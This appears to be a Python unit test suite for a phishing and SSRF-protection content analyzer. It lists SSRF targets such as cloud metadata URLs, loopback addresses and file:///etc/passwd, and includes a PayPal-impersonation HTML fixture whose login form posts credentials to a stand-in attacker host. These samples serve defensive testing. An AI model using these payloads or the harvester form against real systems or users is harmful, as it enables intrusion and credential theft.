"""
Unit and Security Test Suite for Website Content Analyzer & Anti-SSRF Protections.
"""

import unittest
from unittest.mock import patch, MagicMock
from app.content_analyzer import WebsiteContentAnalyzer, SSRFProtectionError


class TestWebsiteContentAnalyzer(unittest.TestCase):

    def test_ssrf_blocking_loopback_and_private_ips(self):
        """Tests that localhost, 127.0.0.1, 169.254.169.254, and 192.168.x.x are blocked."""
        blocked_urls = [
            "http://127.0.0.1/admin",
            "http://localhost:5000",
            "http://169.254.169.254/latest/meta-data/",
            "http://192.168.1.1/config",
            "http://10.0.0.1/internal",
            "http://172.16.0.1/status",
            "http://metadata.google.internal/computeMetadata/v1/"
        ]
        for url in blocked_urls:
            with self.subTest(url=url):
                res = WebsiteContentAnalyzer.fetch_website_content(url)
                self.assertFalse(res['success'])
                self.assertEqual(res['status'], 'blocked_ssrf')

    def test_disallowed_schemes(self):
        """Tests that non-HTTP/HTTPS schemes are blocked."""
        invalid_urls = [
            "file:///etc/passwd",
            "gopher://127.0.0.1:70",
            "ftp://example.com/file.txt",
            "data:text/html,<h1>test</h1>"
        ]
        for url in invalid_urls:
            with self.subTest(url=url):
                res = WebsiteContentAnalyzer.fetch_website_content(url)
                self.assertFalse(res['success'])
                self.assertEqual(res['status'], 'blocked_ssrf')

    def test_legitimate_html_content_analysis(self):
        """Tests HTML content analysis on clean, legitimate web page structure."""
        html_text = """
        <!DOCTYPE html>
        <html>
        <head><title>Google Search</title></head>
        <body>
            <h1>Google Search</h1>
            <p>Search the world's information, including webpages, images, videos and more.</p>
            <form action="/search" method="GET">
                <input type="text" name="q" placeholder="Search Google">
                <input type="submit" value="Google Search">
            </form>
        </body>
        </html>
        """
        fetch_result = {
            'success': True,
            'status': 'fetched',
            'final_url': 'https://www.google.com/search',
            'html_content': html_text
        }
        res = WebsiteContentAnalyzer.analyze_html_content('https://www.google.com', fetch_result)
        
        self.assertTrue(res['content_retrieved'])
        self.assertEqual(res['title'], 'Google Search')
        self.assertFalse(res['has_password_input'])
        self.assertEqual(res['form_count'], 1)
        self.assertFalse(res['brand_mismatch'])
        self.assertEqual(res['brand_detected'], 'Google')

    def test_phishing_brand_mismatch_and_credential_harvester(self):
        """Tests detection of brand impersonation, password inputs, and external form actions."""
        html_text = """
        <!DOCTYPE html>
        <html>
        <head><title>PayPal Security Account Verification</title></head>
        <body>
            <h2>Verify Your PayPal Account Credentials</h2>
            <form action="http://hacker-receiver.net/steal.php" method="POST">
                <input type="text" name="email" placeholder="PayPal Email">
                <input type="password" name="password" placeholder="Password">
                <input type="submit" value="Log In">
            </form>
            <iframe src="http://evil.com/track" style="display:none;"></iframe>
        </body>
        </html>
        """
        fetch_result = {
            'success': True,
            'status': 'fetched',
            'final_url': 'http://verify-paypal-secure.info/login.php',
            'html_content': html_text
        }
        res = WebsiteContentAnalyzer.analyze_html_content('http://verify-paypal-secure.info', fetch_result)

        self.assertTrue(res['content_retrieved'])
        self.assertTrue(res['has_password_input'])
        self.assertEqual(res['password_input_count'], 1)
        self.assertTrue(res['brand_mismatch'])
        self.assertEqual(res['brand_detected'], 'Paypal')
        self.assertEqual(len(res['external_form_actions']), 1)
        self.assertEqual(res['hidden_iframe_count'], 1)

    def test_inaccessible_url_and_timeout_handling(self):
        """Tests handling when a website is offline, times out, or returns fetch errors."""
        fetch_result = {
            'success': False,
            'status': 'timeout',
            'final_url': 'http://offline-website-example.org',
            'error_message': 'Website connection or response timed out (4.0s max limit).'
        }
        content_res = WebsiteContentAnalyzer.analyze_html_content('http://offline-website-example.org', fetch_result)
        self.assertFalse(content_res['content_retrieved'])

        eval_res = WebsiteContentAnalyzer.evaluate_hybrid_risk(
            raw_url='http://offline-website-example.org',
            ml_risk_score=25.0,
            ml_prediction='Legitimate',
            content_analysis=content_res
        )

        self.assertEqual(eval_res['outcome_level'], 'UNKNOWN / UNVERIFIED')
        self.assertEqual(eval_res['prediction_label'], 'Unverified')
        self.assertFalse(eval_res['content_retrieved'])
        self.assertIn('unreachable', eval_res['summary_text'])

    def test_hybrid_risk_evaluation_outcomes(self):
        """Tests HIGH, MEDIUM, LOW risk outcome levels."""
        # 1. High Risk Case
        high_content = {
            'content_retrieved': True,
            'brand_mismatch': True,
            'brand_detected': 'PayPal',
            'has_password_input': True,
            'external_form_actions': ['http://evil.com/post'],
            'reasons': ['Brand impersonation detected']
        }
        res_high = WebsiteContentAnalyzer.evaluate_hybrid_risk('http://fake-paypal.com', 80.0, 'Phishing', high_content)
        self.assertEqual(res_high['outcome_level'], 'HIGH')
        self.assertGreaterEqual(res_high['combined_risk_score'], 70.0)

        # 2. Low Risk Case
        low_content = {
            'content_retrieved': True,
            'brand_mismatch': False,
            'brand_detected': 'Google',
            'has_password_input': False,
            'external_form_actions': [],
            'reasons': ['Valid brand match']
        }
        res_low = WebsiteContentAnalyzer.evaluate_hybrid_risk('https://www.google.com', 5.0, 'Legitimate', low_content)
        self.assertEqual(res_low['outcome_level'], 'LOW')
        self.assertLess(res_low['combined_risk_score'], 40.0)


if __name__ == '__main__':
    unittest.main()
